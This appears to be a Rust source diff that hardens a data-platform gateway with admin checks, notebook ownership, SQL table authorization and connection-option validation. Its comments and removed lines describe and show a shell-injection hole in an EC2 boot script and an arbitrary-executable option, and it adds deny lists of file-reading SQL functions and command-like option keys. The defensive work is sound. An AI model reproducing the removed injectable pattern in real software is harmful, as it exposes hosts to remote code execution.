@@ -22,7 +22,9 @@ use jsonwebtoken::{decode, encode, DecodingKey, EncodingKey, Header, Validation}
 use serde::{Deserialize, Serialize};
 use tower_http::services::ServeDir;
 use weft_clustermgr::Phase;
-use weft_govern::{Effect, Grant, Principal, Privilege, Securable, SecurableType};
+use weft_govern::{
+    Effect, Evaluator, Grant, Identity, Ownership, Principal, Privilege, Securable, SecurableType,
+};
 use weft_loom::arrow::util::display::{ArrayFormatter, FormatOptions};
 use weft_loom::Engine;
 
@@ -359,6 +361,39 @@ impl AppState {
         let mut n = self.next_id.lock().unwrap();
         *n += 1;
         format!("{prefix}-{n}")
+    }
+
+    /// Groups `user` belongs to, resolved from the server-side group store (the source of truth —
+    /// never the JWT body). Used to build the governance identity for the SQL data path.
+    pub(crate) fn groups_of(&self, user: &str) -> Vec<String> {
+        self.groups
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|(_, members)| members.iter().any(|m| m == user))
+            .map(|(g, _)| g.clone())
+            .collect()
+    }
+
+    /// Whether `user` is an administrator (member of the `admins` group), resolved server-side.
+    pub(crate) fn is_admin(&self, user: &str) -> bool {
+        self.groups
+            .lock()
+            .unwrap()
+            .get("admins")
+            .is_some_and(|m| m.iter().any(|x| x == user))
+    }
+
+    /// Build a governance [`Evaluator`] from the current grant set. The bootstrap operator group
+    /// `admins` owns the metastore (full access on the whole tree); every other principal is governed
+    /// purely by explicit grants — i.e. fail-closed, sees nothing it wasn't granted.
+    pub(crate) fn evaluator(&self) -> Evaluator {
+        let grants = self.grants.lock().unwrap().clone();
+        let owners = vec![Ownership {
+            securable: Securable::metastore(),
+            principal: Principal::Group("admins".into()),
+        }];
+        Evaluator::with_owners(grants, owners)
     }
 
     // Durable persistence (best-effort, off the request path). Workspace → S3; clusters +
@@ -901,8 +936,10 @@ async fn list_clusters(State(st): State<AppState>) -> Json<Vec<Cluster>> {
 
 async fn create_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(body): Json<CreateCluster>,
-) -> (StatusCode, Json<Cluster>) {
+) -> Result<(StatusCode, Json<Cluster>), StatusCode> {
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let id = st.new_id();
     let cluster = Cluster {
         id: id.clone(),
@@ -930,7 +967,7 @@ async fn create_cluster(
     // returns immediately while the cluster comes up — poll the list / events to watch it advance.
     st.touch(&id);
     tokio::spawn(provision(st.clone(), id));
-    (StatusCode::CREATED, Json(cluster))
+    Ok((StatusCode::CREATED, Json(cluster)))
 }
 
 /// Build the `WEFT_CATALOG_CONF` value (`;`-separated `spark.sql.catalog.<name>.*` entries) from the
@@ -962,15 +999,145 @@ fn cluster_catalog_conf(st: &AppState, default_region: &str) -> String {
     parts.join(";")
 }
 
-/// Materialize a cluster into a real Spark Connect server process and advance its state. On EKS the
-/// operator would create driver + worker pods here; on this single node it spawns a `weft spark
-/// server` on an allocated port — a genuine, connectable endpoint.
+/// Render the EC2 boot script. The operator-controlled `weft_url`/`region` are interpolated directly;
+/// the attached-catalog config — the only attacker-influenced input — is carried as **inert base64**
+/// and decoded into the env var at runtime via a quoted command substitution, so the shell never
+/// re-parses its contents. This removes the user-data injection RCE entirely: even a connection field
+/// that slipped past validation (e.g. a single-quote breakout) is just opaque bytes here, never a
+/// shell literal. (Previously `WEFT_CATALOG_CONF='{catalog_conf}'` let a `'` in a connection uri/name
+/// break out and run as root at boot on an IAM-instance-profile box.)
+fn ec2_user_data(weft_url: &str, region: &str, catalog_conf: &str) -> String {
+    let catalog_b64 = base64_encode(catalog_conf.as_bytes());
+    format!(
+        "#!/bin/bash\nset -e\n\
+         curl -fsSL '{weft_url}' -o /usr/local/bin/weft\nchmod +x /usr/local/bin/weft\n\
+         export AWS_REGION='{region}'\n\
+         export WEFT_CATALOG_CONF=\"$(printf %s '{catalog_b64}' | base64 -d)\"\n\
+         /usr/local/bin/weft spark server --port 50051 > /var/log/weft.log 2>&1 &\n"
+    )
+}
+
+/// Whether the Kubernetes orchestrator backend is selected (`WEFT_ORCHESTRATOR=k8s`).
+fn orchestrator_is_k8s() -> bool {
+    std::env::var("WEFT_ORCHESTRATOR").as_deref() == Ok("k8s")
+}
+
+/// Materialize a cluster into real compute and advance its state. The backend is selected at runtime:
+/// `k8s` applies hardened pod manifests via the orchestrator (no shell), otherwise a real EC2 instance
+/// (when configured) or a local `weft spark server` process for dev — same lifecycle states.
 async fn provision(st: AppState, id: String) {
     st.set_state(&id, Phase::Provisioning, None);
-    if st.ec2.as_ref().is_some() {
+    if orchestrator_is_k8s() {
+        provision_k8s(st, id).await;
+    } else if st.ec2.as_ref().is_some() {
         provision_ec2(st, id).await;
     } else {
         provision_process(st, id).await;
+    }
+}
+
+/// Map a `worker_size` class to per-pod CPU/memory.
+fn pod_resources_for(size: &str) -> (String, String) {
+    match size {
+        "small" => ("1".into(), "2Gi".into()),
+        "medium" => ("2".into(), "4Gi".into()),
+        "large" => ("4".into(), "8Gi".into()),
+        "xlarge" => ("8".into(), "16Gi".into()),
+        _ => ("1".into(), "2Gi".into()),
+    }
+}
+
+/// The attached-catalog config as typed `(key, value)` pairs (the inert form the orchestrator
+/// serializes into a ConfigMap value — never a shell token).
+fn cluster_catalog_pairs(st: &AppState, default_region: &str) -> Vec<(String, String)> {
+    let conns = st.connections.lock().unwrap();
+    let mut pairs = Vec::new();
+    for c in conns.iter() {
+        let p = format!("spark.sql.catalog.{}", c.name);
+        pairs.push((format!("{p}.type"), c.kind.clone()));
+        match c.kind.as_str() {
+            "glue" => {
+                let region = c
+                    .options
+                    .get("region")
+                    .map(String::as_str)
+                    .unwrap_or(default_region);
+                pairs.push((format!("{p}.region"), region.to_string()));
+            }
+            "hive" => {
+                if let Some(uri) = c.options.get("uri") {
+                    pairs.push((format!("{p}.uri"), uri.clone()));
+                }
+            }
+            _ => {}
+        }
+    }
+    pairs
+}
+
+/// Provision a cluster as hardened Kubernetes pods via the orchestrator. The driver/worker images,
+/// region, IRSA role, egress allowlist, and CSI secret class come from operator config (env), never
+/// a request body; the catalog config is passed as inert typed pairs.
+async fn provision_k8s(st: AppState, id: String) {
+    use weft_orchestrator::{ClusterBackend, ClusterSpec, K8sBackend};
+    let region = std::env::var("AWS_REGION").unwrap_or_else(|_| "us-west-2".into());
+    let (size, worker_min, worker_max) = {
+        let clusters = st.clusters.lock().unwrap();
+        clusters
+            .get(&id)
+            .map(|c| (c.worker_size.clone(), c.worker_min, c.worker_max))
+            .unwrap_or_else(|| ("small".into(), 1, 1))
+    };
+    let (cpu, memory) = pod_resources_for(&size);
+    let image =
+        std::env::var("WEFT_CLUSTER_IMAGE").unwrap_or_else(|_| "weft/connect-server:latest".into());
+    let worker_image = std::env::var("WEFT_WORKER_IMAGE").unwrap_or_else(|_| image.clone());
+    // IRSA role ARN is derived server-side from an operator prefix + the cluster id, so a request can
+    // never bind another tenant's identity.
+    let iam_role_arn = std::env::var("WEFT_CLUSTER_IRSA_ROLE_PREFIX")
+        .ok()
+        .map(|p| format!("{p}{id}"));
+    let egress_cidrs = std::env::var("WEFT_CLUSTER_EGRESS_CIDRS")
+        .ok()
+        .map(|s| {
+            s.split(',')
+                .map(|x| x.trim().to_string())
+                .filter(|x| !x.is_empty())
+                .collect()
+        })
+        .unwrap_or_default();
+    let spec = ClusterSpec {
+        id: id.clone(),
+        image,
+        worker_image,
+        region: region.clone(),
+        port: 50051,
+        worker_min,
+        worker_max,
+        cpu,
+        memory,
+        service_account: format!("weft-cl-{id}"),
+        iam_role_arn,
+        catalog_conf: cluster_catalog_pairs(&st, &region),
+        secret_provider_class: std::env::var("WEFT_CLUSTER_SECRET_CLASS").ok(),
+        egress_cidrs,
+    };
+    st.add_event(
+        &id,
+        "Applying Kubernetes manifests (namespace, hardened pods, NetworkPolicy, IRSA)",
+    );
+    match K8sBackend::from_env().provision(&spec).await {
+        Ok(()) => {
+            // The driver's readiness probe gates real traffic; a production reconcile loop would gate
+            // the RUNNING transition on EndpointSlice readiness. The endpoint is stable Service DNS.
+            let endpoint = spec.endpoint();
+            st.set_state(&id, Phase::Running, Some(endpoint.clone()));
+            st.add_event(&id, format!("Cluster RUNNING — Spark Connect endpoint {endpoint}"));
+        }
+        Err(e) => {
+            st.set_state(&id, Phase::Error, None);
+            st.add_event(&id, format!("Kubernetes provisioning failed: {e}"));
+        }
     }
 }
 
@@ -1008,10 +1175,9 @@ async fn provision_ec2(st: AppState, id: String) {
 
     // user-data: download the weft binary and run the Spark Connect server on boot, with AWS region
     // + catalog config in the environment so external catalogs (Glue/Hive) resolve on the cluster.
-    let user_data = format!(
-        "#!/bin/bash\nset -e\ncurl -fsSL '{}' -o /usr/local/bin/weft\nchmod +x /usr/local/bin/weft\nexport AWS_REGION='{}'\nexport WEFT_CATALOG_CONF='{}'\n/usr/local/bin/weft spark server --port 50051 > /var/log/weft.log 2>&1 &\n",
-        cfg.weft_url, cfg.region, catalog_conf
-    );
+    // Catalog conf is carried as inert base64 (see `ec2_user_data`) — never interpolated as a shell
+    // literal.
+    let user_data = ec2_user_data(&cfg.weft_url, &cfg.region, &catalog_conf);
     let user_data_b64 = base64_encode(user_data.as_bytes());
 
     let mut args: Vec<String> = vec![
@@ -1262,7 +1428,14 @@ async fn list_cluster_events(
     )
 }
 
-async fn delete_cluster(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_cluster(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
+    if oidc::require_admin(&claims).is_err() {
+        return StatusCode::FORBIDDEN;
+    }
     let existed = st.clusters.lock().unwrap().remove(&id).is_some();
     if !existed {
         return StatusCode::NOT_FOUND;
@@ -1275,8 +1448,10 @@ async fn delete_cluster(State(st): State<AppState>, Path(id): Path<String>) -> S
 
 async fn start_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1298,8 +1473,10 @@ async fn start_cluster(
 
 async fn stop_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
+    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1316,8 +1493,15 @@ async fn stop_cluster(
         .ok_or(StatusCode::NOT_FOUND)
 }
 
-/// Kill the OS process backing a cluster, if any.
+/// Tear down the compute backing a cluster. Under the Kubernetes backend this deletes the cluster's
+/// namespace (cascade-GCs the workload); it also removes any local process / EC2 runtime handle.
 async fn kill_runtime(st: &AppState, id: &str) {
+    if orchestrator_is_k8s() {
+        use weft_orchestrator::ClusterBackend;
+        if let Err(e) = weft_orchestrator::K8sBackend::from_env().terminate(id).await {
+            st.add_event(id, format!("Kubernetes teardown error: {e}"));
+        }
+    }
     let rt = st.runtimes.lock().await.remove(id);
     match rt {
         Some(ClusterRuntime::Process(mut child)) => {
@@ -1370,11 +1554,113 @@ pub struct SqlResponse {
     pub error: Option<String>,
 }
 
-/// Run a SQL query on the embedded engine and return rows. Spark-dialect input is passed through
-/// [`weft_sql::dialect`] first. In production this routes to the target cluster's Spark Connect
-/// endpoint; here it runs in-process on the same engine — real execution, real results.
-async fn run_sql(State(st): State<AppState>, Json(req): Json<SqlRequest>) -> Json<SqlResponse> {
+/// An error-only [`SqlResponse`] (empty result + message), used for governance denials and failures.
+fn sql_error(msg: impl Into<String>) -> SqlResponse {
+    SqlResponse {
+        columns: vec![],
+        rows: vec![],
+        row_count: 0,
+        error: Some(msg.into()),
+    }
+}
+
+/// Conservatively deny SQL that reads files directly (bypassing catalog governance) for governed
+/// (non-admin) sessions: file-scan table functions, `CREATE EXTERNAL TABLE … LOCATION`, and `COPY`.
+/// These have no securable to gate and would otherwise read raw object storage with the engine's
+/// credentials. Defense-in-depth on top of table-reference authorization; over-denial is acceptable
+/// (safe). The input is the translated SQL.
+fn forbidden_construct(sql: &str) -> Option<&'static str> {
+    let s = sql.to_ascii_lowercase();
+    for f in ["read_parquet", "read_csv", "read_json", "read_avro", "read_ndjson"] {
+        if s.contains(&format!("{f}(")) || s.contains(&format!("{f} (")) {
+            return Some("file-scan table functions are not permitted");
+        }
+    }
+    if s.contains("create external table") {
+        return Some("CREATE EXTERNAL TABLE is not permitted");
+    }
+    if s.contains("copy ") && (s.contains(" to ") || s.contains(" from ")) {
+        return Some("COPY is not permitted");
+    }
+    None
+}
+
+/// A stable, per-principal+cluster Spark Connect session id. Replaces a single hardcoded id shared
+/// by every user (which collided sessions / temp views / caches across principals). Deterministic
+/// across gateway restarts (so a user keeps their session) and distinct per (user, cluster). FNV-1a
+/// avoids a new dependency; the id is opaque to Spark Connect, formatted UUID-shaped for familiarity.
+fn session_id_for(user: &str, cluster: &str) -> String {
+    fn fnv1a(seed: u64, data: &[u8]) -> u64 {
+        let mut h = seed;
+        for &b in data {
+            h ^= b as u64;
+            h = h.wrapping_mul(0x0000_0100_0000_01b3);
+        }
+        h
+    }
+    let key = format!("{user}\u{0}{cluster}");
+    let lo = fnv1a(0xcbf2_9ce4_8422_2325, key.as_bytes());
+    let hi = fnv1a(0x8422_2325_cbf2_9ce4, key.as_bytes());
+    format!(
+        "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
+        (hi >> 32) as u32,
+        (hi >> 16) as u16,
+        hi as u16,
+        (lo >> 48) as u16,
+        lo & 0xffff_ffff_ffff,
+    )
+}
+
+/// Walk a resolved (optimized) logical plan and return the first table reference the `identity` may
+/// not `SELECT`. References in the session-scratch default catalog (temp views / ad-hoc registered
+/// tables) are skipped — any governed data they could expose is itself read through a governed
+/// `TableScan` elsewhere in the same plan. Using the optimized plan decorrelates subqueries so their
+/// base scans surface as plan nodes. This is gateway-side *defense-in-depth*; resolution oddities
+/// fail closed.
+fn first_unauthorized_table(
+    eval: &Evaluator,
+    identity: &Identity,
+    default_catalog: &str,
+    default_schema: &str,
+    plan: &datafusion::logical_expr::LogicalPlan,
+) -> Option<String> {
+    use datafusion::common::tree_node::{TreeNode, TreeNodeRecursion};
+    use datafusion::logical_expr::LogicalPlan;
+    let mut denied: Option<String> = None;
+    let _ = plan.apply(|node| {
+        if let LogicalPlan::TableScan(scan) = node {
+            let r = scan
+                .table_name
+                .clone()
+                .resolve(default_catalog, default_schema);
+            // Govern only named catalogs; the default catalog is session scratch.
+            if r.catalog.as_ref() != default_catalog {
+                let securable =
+                    Securable::table(r.catalog.as_ref(), r.schema.as_ref(), r.table.as_ref());
+                if !eval.can(identity, Privilege::Select, &securable) {
+                    denied = Some(format!("{}.{}.{}", r.catalog, r.schema, r.table));
+                    return Ok(TreeNodeRecursion::Stop);
+                }
+            }
+        }
+        Ok(TreeNodeRecursion::Continue)
+    });
+    denied
+}
+
+/// Run a SQL query and return rows, enforced for the caller's identity. Spark-dialect input is passed
+/// through [`weft_sql::dialect`] first. A selected RUNNING cluster routes execution to its Spark
+/// Connect endpoint (the real data-plane hop); otherwise it runs on the gateway's governed embedded
+/// engine. Governed (non-admin) sessions are authorized against the resolved plan's table scans and
+/// denied direct file reads; cluster routing is fail-closed for non-admins until engine-side
+/// enforcement lands.
+async fn run_sql(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(req): Json<SqlRequest>,
+) -> Json<SqlResponse> {
     const MAX_ROWS: usize = 1000;
+    let is_admin = st.is_admin(&claims.sub);
     // If a RUNNING cluster is selected, route execution to its Spark Connect endpoint (the real
     // data-plane hop); otherwise run on the gateway's embedded engine. A non-running selection
     // falls back to the embedded engine.
@@ -1391,35 +1677,67 @@ async fn run_sql(State(st): State<AppState>, Json(req): Json<SqlRequest>) -> Jso
             })
         };
         if let Some(ep) = endpoint {
-            return match cluster_client::run_sql_on_cluster(&ep, &req.sql, MAX_ROWS).await {
+            // SECURITY: cluster-routed SQL bypasses the governed embedded engine and reaches a Spark
+            // Connect server that does not yet enforce per-identity governance. Until then, routing
+            // is restricted to admins; non-admins fall back to the governed embedded engine below.
+            if !is_admin {
+                return Json(sql_error(
+                    "cluster-routed queries are temporarily restricted to admins \
+                     (engine-side governance enforcement pending)",
+                ));
+            }
+            let session = session_id_for(&claims.sub, cid);
+            return match cluster_client::run_sql_on_cluster(&ep, &session, &req.sql, MAX_ROWS).await
+            {
                 Ok(batches) => Json(batches_to_response(&batches)),
-                Err(e) => Json(SqlResponse {
-                    columns: vec![],
-                    rows: vec![],
-                    row_count: 0,
-                    error: Some(format!("cluster `{cid}`: {e}")),
-                }),
+                Err(e) => Json(sql_error(format!("cluster `{cid}`: {e}"))),
             };
         }
     }
     let sql = weft_sql::dialect::to_datafusion_sql(&req.sql);
+    // Governed (non-admin) sessions: deny direct file reads, then authorize every table the resolved
+    // plan scans. Admins own the metastore, so they are authorized by construction and skip the walk.
+    if !is_admin {
+        if let Some(reason) = forbidden_construct(&sql) {
+            return Json(sql_error(reason));
+        }
+    }
     // Cap execution at the UI display limit so an unbounded `SELECT *` over a huge external table
     // (e.g. 100M-row ClickBench `hits`) reads only enough row groups instead of materializing the
     // whole result into memory (which previously OOMed → "load failed"). LIMIT pushes into the scan.
+    let df = match st.engine.ctx().sql(&sql).await {
+        Ok(df) => df,
+        Err(e) => return Json(sql_error(format!("{e}"))),
+    };
+    if !is_admin {
+        let plan = match df.clone().into_optimized_plan() {
+            Ok(p) => p,
+            Err(e) => return Json(sql_error(format!("{e}"))),
+        };
+        let identity = crate::authz::identity_of(&st, &claims);
+        let evaluator = st.evaluator();
+        let state = st.engine.ctx().state();
+        let cat = &state.config().options().catalog;
+        if let Some(denied) = first_unauthorized_table(
+            &evaluator,
+            &identity,
+            &cat.default_catalog,
+            &cat.default_schema,
+            &plan,
+        ) {
+            return Json(sql_error(format!(
+                "permission denied: no SELECT privilege on {denied}"
+            )));
+        }
+    }
     let result = async {
-        let df = st.engine.ctx().sql(&sql).await?;
         let df = df.limit(0, Some(MAX_ROWS))?;
         df.collect().await
     }
     .await;
     match result {
         Ok(batches) => Json(batches_to_response(&batches)),
-        Err(e) => Json(SqlResponse {
-            columns: vec![],
-            rows: vec![],
-            row_count: 0,
-            error: Some(format!("{e}")),
-        }),
+        Err(e) => Json(sql_error(format!("{e}"))),
     }
 }
 
@@ -1730,13 +2048,118 @@ async fn list_connections(State(st): State<AppState>) -> Json<Vec<ConnectionInfo
     Json(st.connections.lock().unwrap().clone())
 }
 
+/// Whether an option key could name an executable, filesystem path, endpoint, or command an
+/// attacker could point at arbitrary code. The motivating case is Glue's `aws_bin`, which fed
+/// `Command::new(options["aws_bin"])` — a request-controlled arbitrary-executable RCE on the
+/// gateway host. Such keys are rejected outright (defense-in-depth on top of the per-kind allowlist).
+fn is_forbidden_option_key(key: &str) -> bool {
+    let k = key.to_ascii_lowercase();
+    k == "aws_bin"
+        || k.ends_with("_bin")
+        || k.ends_with("_path")
+        || k.ends_with("_endpoint")
+        || k.ends_with("_cmd")
+        || k.ends_with("_command")
+        || k.ends_with("_exe")
+}
+
+/// A DNS-1123 label: lowercase alphanumerics and `-`, starting and ending alphanumeric, ≤ 63 chars.
+/// This is simultaneously a safe SQL/catalog identifier and a valid Kubernetes object-name component
+/// (the K8s backend derives namespace/object names from the connection name), so enforcing it here —
+/// at the builder boundary, not only at the HTTP edge — closes name-injection into both layers.
+fn is_dns1123_label(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 63
+        && s.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
+        && s.bytes().last().is_some_and(|b| b.is_ascii_alphanumeric())
+        && s.bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+}
+
+/// An AWS region token: lowercase alphanumerics and `-` only (e.g. `us-west-2`).
+fn is_aws_region(s: &str) -> bool {
+    (4..=32).contains(&s.len())
+        && s.contains('-')
+        && s.bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+}
+
+/// A conservative `scheme://host[:port]` (or `host[:port]`) charset for catalog endpoints: no quotes,
+/// whitespace, or shell/label metacharacters. Keeps an endpoint inert when it is later serialized
+/// into a pod's mounted catalog-conf file or a k8s label.
+fn is_safe_endpoint(s: &str) -> bool {
+    (1..=255).contains(&s.len())
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b':' | b'/'))
+}
+
+/// Validate an external-catalog connection request against a **per-kind typed allowlist**: the name
+/// must be a DNS-1123 label, no forbidden (binary/path/endpoint/command) keys may appear, and every
+/// option key must be known for the kind with a value matching its expected shape. Unknown keys are
+/// rejected, not ignored. Enforced at the builder boundary so it covers the live attach path and
+/// persisted-connection re-registration alike.
+fn validate_connection(
+    kind: &str,
+    name: &str,
+    options: &HashMap<String, String>,
+) -> Result<(), String> {
+    if !is_dns1123_label(name) {
+        return Err(format!(
+            "invalid connection name `{name}`: must be a DNS-1123 label \
+             (lowercase alphanumerics and '-', ≤63 chars)"
+        ));
+    }
+    for k in options.keys() {
+        if is_forbidden_option_key(k) {
+            return Err(format!(
+                "option `{k}` is not allowed: binary/path/endpoint/command keys are forbidden"
+            ));
+        }
+    }
+    let bad = |key: &str| Err(format!("invalid value for option `{key}`"));
+    match kind {
+        "glue" => {
+            for (k, v) in options {
+                match k.as_str() {
+                    "region" if is_aws_region(v) => {}
+                    "region" => return bad("region"),
+                    other => {
+                        return Err(format!("unsupported glue option `{other}` (allowed: region)"))
+                    }
+                }
+            }
+        }
+        "hive" => {
+            for (k, v) in options {
+                match k.as_str() {
+                    "uri" | "thrift.uri" | "host" if is_safe_endpoint(v) => {}
+                    "uri" | "thrift.uri" | "host" => return bad(k),
+                    "port" if !v.is_empty() && v.bytes().all(|b| b.is_ascii_digit()) => {}
+                    "port" => return bad("port"),
+                    "type" if v.bytes().all(|b| b.is_ascii_alphanumeric()) => {}
+                    "type" => return bad("type"),
+                    other => {
+                        return Err(format!(
+                            "unsupported hive option `{other}` (allowed: uri, host, port, type)"
+                        ))
+                    }
+                }
+            }
+        }
+        other => return Err(format!("unsupported connection kind: {other}")),
+    }
+    Ok(())
+}
+
 /// Build a [`weft_catalog::CatalogProvider`] for a connection `kind` + `options`, used both by the
-/// live attach path and when re-registering persisted connections on startup.
+/// live attach path and when re-registering persisted connections on startup. Rejects any request
+/// that fails [`validate_connection`] before constructing a provider.
 fn build_connection_provider(
     kind: &str,
     name: &str,
     options: &HashMap<String, String>,
 ) -> Result<Arc<dyn weft_catalog::CatalogProvider>, String> {
+    validate_connection(kind, name, options)?;
     match kind {
         "glue" => Ok(Arc::new(GlueCatalog::from_config(name, options))),
         "hive" => Ok(Arc::new(
@@ -1753,8 +2176,10 @@ fn build_connection_provider(
 /// to every cluster the gateway provisions.
 async fn create_connection(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(b): Json<CreateConnection>,
 ) -> Result<StatusCode, (StatusCode, String)> {
+    oidc::require_admin(&claims)?;
     let provider = build_connection_provider(&b.kind, &b.name, &b.options)
         .map_err(|e| (StatusCode::BAD_REQUEST, e))?;
     st.engine.register_catalog(&b.name, provider);
@@ -1777,8 +2202,10 @@ async fn create_connection(
 /// provider lingers in memory until the next restart; the catalog browser filters it out by name.)
 async fn delete_connection(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(name): Path<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
+    oidc::require_admin(&claims)?;
     let removed = {
         let mut conns = st.connections.lock().unwrap();
         let before = conns.len();
@@ -1811,6 +2238,11 @@ pub struct NotebookDoc {
     pub cells: Vec<NotebookCell>,
     #[serde(default, rename = "updatedAt")]
     pub updated_at: String,
+    /// Owning principal (`Claims.sub`). Set server-side on create and preserved on save — the client
+    /// cannot change it. Authorization keys off this so a principal reaches only its own notebooks.
+    /// Legacy docs persisted before ownership existed deserialize to `""` (admin-only).
+    #[serde(default)]
+    pub owner: String,
 }
 
 /// List-view summary of a notebook (matches the web `Notebook` shape).
@@ -1834,6 +2266,9 @@ pub struct SavedQuery {
     pub sql: String,
     #[serde(default, rename = "updatedAt")]
     pub updated_at: String,
+    /// Owning principal (`Claims.sub`); see [`NotebookDoc::owner`].
+    #[serde(default)]
+    pub owner: String,
 }
 
 /// `POST /api/notebooks` body.
@@ -1852,10 +2287,15 @@ pub struct CreateQuery {
     pub sql: String,
 }
 
-async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>> {
+async fn list_notebooks(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+) -> Json<Vec<NotebookSummary>> {
+    let admin = st.is_admin(&claims.sub);
     let nbs = st.notebooks.lock().unwrap();
     Json(
         nbs.iter()
+            .filter(|n| admin || n.owner == claims.sub)
             .map(|n| NotebookSummary {
                 id: n.id.clone(),
                 name: n.name.clone(),
@@ -1864,7 +2304,7 @@ async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>
                     .first()
                     .map(|c| c.kind.clone())
                     .unwrap_or_else(|| "sql".into()),
-                owner: "admin".into(),
+                owner: n.owner.clone(),
                 updated_at: n.updated_at.clone(),
                 cells: n.cells.len(),
             })
@@ -1874,6 +2314,7 @@ async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>
 
 async fn create_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(b): Json<CreateNotebook>,
 ) -> Json<NotebookDoc> {
     let name = if b.name.trim().is_empty() {
@@ -1890,6 +2331,7 @@ async fn create_notebook(
             source: "SELECT * FROM glue.clickbench.hits LIMIT 10".into(),
         }],
         updated_at: now_iso(),
+        owner: claims.sub.clone(),
     };
     st.notebooks.lock().unwrap().push(doc.clone());
     st.save_notebooks();
@@ -1898,42 +2340,64 @@ async fn create_notebook(
 
 async fn get_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<NotebookDoc>, (StatusCode, String)> {
-    st.notebooks
-        .lock()
-        .unwrap()
-        .iter()
-        .find(|n| n.id == id)
-        .cloned()
-        .map(Json)
-        .ok_or((StatusCode::NOT_FOUND, format!("no notebook `{id}`")))
+    let nbs = st.notebooks.lock().unwrap();
+    match nbs.iter().find(|n| n.id == id) {
+        // Not-found (never forbidden) when it isn't yours, so existence isn't leaked.
+        Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => Ok(Json(n.clone())),
+        _ => Err((StatusCode::NOT_FOUND, format!("no notebook `{id}`"))),
+    }
 }
 
 async fn save_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
     Json(mut doc): Json<NotebookDoc>,
-) -> Json<serde_json::Value> {
-    doc.id = id.clone();
-    doc.updated_at = now_iso();
+) -> Result<Json<serde_json::Value>, StatusCode> {
     {
         let mut nbs = st.notebooks.lock().unwrap();
         match nbs.iter_mut().find(|n| n.id == id) {
-            Some(slot) => *slot = doc.clone(),
-            None => nbs.push(doc.clone()), // upsert (e.g. first save of a client-created doc)
+            Some(slot) => {
+                // Only the owner (or an admin) may overwrite; ownership is never reassigned by the
+                // client.
+                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
+                    return Err(StatusCode::NOT_FOUND);
+                }
+                doc.owner = slot.owner.clone();
+                doc.id = id.clone();
+                doc.updated_at = now_iso();
+                *slot = doc.clone();
+            }
+            None => {
+                // First save of a client-created doc → the saver owns it.
+                doc.owner = claims.sub.clone();
+                doc.id = id.clone();
+                doc.updated_at = now_iso();
+                nbs.push(doc.clone());
+            }
         }
     }
     st.save_notebooks();
-    Json(serde_json::json!({ "ok": true, "savedAt": doc.updated_at }))
+    Ok(Json(serde_json::json!({ "ok": true, "savedAt": doc.updated_at })))
 }
 
-async fn delete_notebook(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_notebook(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
     let removed = {
         let mut nbs = st.notebooks.lock().unwrap();
-        let before = nbs.len();
-        nbs.retain(|n| n.id != id);
-        before != nbs.len()
+        match nbs.iter().find(|n| n.id == id) {
+            Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => {
+                nbs.retain(|n| n.id != id);
+                true
+            }
+            _ => false, // missing or not yours → not-found (no existence leak)
+        }
     };
     if removed {
         st.save_notebooks();
@@ -1943,11 +2407,27 @@ async fn delete_notebook(State(st): State<AppState>, Path(id): Path<String>) -> 
     }
 }
 
-async fn list_queries(State(st): State<AppState>) -> Json<Vec<SavedQuery>> {
-    Json(st.queries.lock().unwrap().clone())
+async fn list_queries(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+) -> Json<Vec<SavedQuery>> {
+    let admin = st.is_admin(&claims.sub);
+    Json(
+        st.queries
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|q| admin || q.owner == claims.sub)
+            .cloned()
+            .collect(),
+    )
 }
 
-async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) -> Json<SavedQuery> {
+async fn create_query(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(b): Json<CreateQuery>,
+) -> Json<SavedQuery> {
     let name = if b.name.trim().is_empty() {
         "Untitled query".to_string()
     } else {
@@ -1958,6 +2438,7 @@ async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) ->
         name,
         sql: b.sql,
         updated_at: now_iso(),
